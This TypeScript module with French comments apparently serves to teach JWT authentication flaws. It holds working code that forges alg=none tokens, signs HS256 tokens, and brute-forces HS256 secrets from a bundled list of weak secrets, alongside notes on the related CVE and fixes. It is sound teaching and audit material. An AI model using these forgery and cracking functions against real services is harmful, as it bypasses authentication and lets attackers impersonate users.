// JWT forger — construit des JWTs custom pour démontrer les vulns d'auth.
//
// Approches couvertes :
//   1. alg=none — signature vide, beaucoup d'impls vulnérables encore aujourd'hui
//   2. HS256 avec une clé connue (à fournir)
//   3. alg confusion (HS256 ↔ RS256) — théorique : on génère un HS256 signé
//      avec ce qui SERAIT la public key RS256, ce qui fait passer le token
//      sur certaines impls qui ne re-vérifient pas l'algo.
//
// Pédagogie pure. WebCrypto local. Aucun envoi réseau.

export type JwtForgeMode = 'none' | 'hs256'

export type ForgeResult = {
  token: string
  header: Record<string, unknown>
  payload: Record<string, unknown>
  signaturePart: string
  /** Notes pédagogiques sur ce qui rendrait ce token valide chez un serveur. */
  pedagogy: string[]
}

function base64urlEncode(str: string): string {
  if (typeof btoa !== 'undefined') {
    const b64 = btoa(unescape(encodeURIComponent(str)))
    return b64.replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
  }
  if (typeof Buffer !== 'undefined') {
    return Buffer.from(str, 'utf-8').toString('base64')
      .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
  }
  throw new Error('Pas de base64 encoder dispo')
}

declare const Buffer: undefined | { from: (data: string, enc: string) => { toString: (enc: string) => string } }

function base64urlEncodeBytes(bytes: Uint8Array): string {
  let bin = ''
  for (let i = 0; i < bytes.length; i += 1) bin += String.fromCharCode(bytes[i])
  if (typeof btoa !== 'undefined') {
    return btoa(bin).replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
  }
  if (typeof Buffer !== 'undefined') {
    return Buffer.from(bin, 'binary').toString('base64')
      .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
  }
  throw new Error('Pas de base64 encoder dispo')
}

/**
 * Forge un JWT alg=none.
 * Signature = vide. Token = header.payload. (avec un point trailing pour
 * respecter le format 3-parts — historiquement les libs vulnérables
 * acceptent les deux formes.)
 */
export function forgeAlgNone(payload: Record<string, unknown>): ForgeResult {
  const header = { alg: 'none', typ: 'JWT' }
  const headerB64 = base64urlEncode(JSON.stringify(header))
  const payloadB64 = base64urlEncode(JSON.stringify(payload))
  return {
    token: `${headerB64}.${payloadB64}.`,
    header,
    payload,
    signaturePart: '',
    pedagogy: [
      'Le header annonce alg=none — pas de signature attendue.',
      'CVE 2015-9235 : beaucoup de libs (jsonwebtoken < 4.2.2, etc.) acceptaient alg=none par défaut.',
      'Si le serveur fait jwt.verify(token, secret) SANS spécifier algorithms=[…], la lib choisit ce que dit le header.',
      'Fix : toujours passer { algorithms: ["HS256"] } à verify() et REJETER alg=none côté UI/middleware.',
      'Audit ce token avec le JWT Inspector — il flaggue alg=none en BLOCK.',
    ],
  }
}

/**
 * Forge un JWT HS256 signé avec un secret donné.
 */
export async function forgeHs256(payload: Record<string, unknown>, secret: string): Promise<ForgeResult> {
  if (typeof crypto === 'undefined' || !crypto.subtle) {
    throw new Error('WebCrypto requis pour HS256')
  }
  const header = { alg: 'HS256', typ: 'JWT' }
  const headerB64 = base64urlEncode(JSON.stringify(header))
  const payloadB64 = base64urlEncode(JSON.stringify(payload))
  const signingInput = `${headerB64}.${payloadB64}`

  const enc = new TextEncoder()
  const key = await crypto.subtle.importKey(
    'raw', enc.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false, ['sign'],
  )
  const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(signingInput))
  const sigB64 = base64urlEncodeBytes(new Uint8Array(sigBuf))
  return {
    token: `${signingInput}.${sigB64}`,
    header,
    payload,
    signaturePart: sigB64,
    pedagogy: [
      `HMAC-SHA256 avec un secret partagé : la sécurité repose entièrement sur la confidentialité du secret.`,
      'Si le secret fuite (config dans git, env exposé, etc.), n\'importe qui forge un token valide.',
      'Mauvaises pratiques courantes : secret court ("secret", "key"), réutilisé entre envs, hardcodé.',
      'Fix : 32 bytes random au minimum, rotation périodique, secret managers (Vault, AWS KMS).',
      `Sur des projets sensibles : préférer RS256 (asym) — le serveur signe avec sa private key, n'importe qui vérifie avec la public key.`,
    ],
  }
}

/**
 * Brute-force d'un secret HS256 contre un token donné (avec une wordlist
 * fournie). Pour découvrir un secret faible.
 */
export async function crackHs256(token: string, wordlist: string[]): Promise<{ found: boolean; secret?: string; attempts: number; durationMs: number }> {
  const parts = token.split('.')
  if (parts.length !== 3) return { found: false, attempts: 0, durationMs: 0 }
  const [headerB64, payloadB64, sigB64] = parts
  const signingInput = `${headerB64}.${payloadB64}`
  const enc = new TextEncoder()
  const start = performance.now()
  for (let i = 0; i < wordlist.length; i += 1) {
    const candidate = wordlist[i]
    try {
      const key = await crypto.subtle.importKey(
        'raw', enc.encode(candidate),
        { name: 'HMAC', hash: 'SHA-256' },
        false, ['sign'],
      )
      const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(signingInput))
      const sig = base64urlEncodeBytes(new Uint8Array(sigBuf))
      if (sig === sigB64) {
        return { found: true, secret: candidate, attempts: i + 1, durationMs: performance.now() - start }
      }
    } catch { /* skip */ }
  }
  return { found: false, attempts: wordlist.length, durationMs: performance.now() - start }
}

export const JWT_WEAK_SECRETS: readonly string[] = [
  'secret', 'password', '123456', 'changeme', 'admin',
  'jwt', 'mysecret', 'key', 'jwtsecret', 'shhh',
  'auth', 'app', 'dev', 'test', 'production',
  'aurora', 'aurora_secret', 'staging', 'hello', 'world',
]
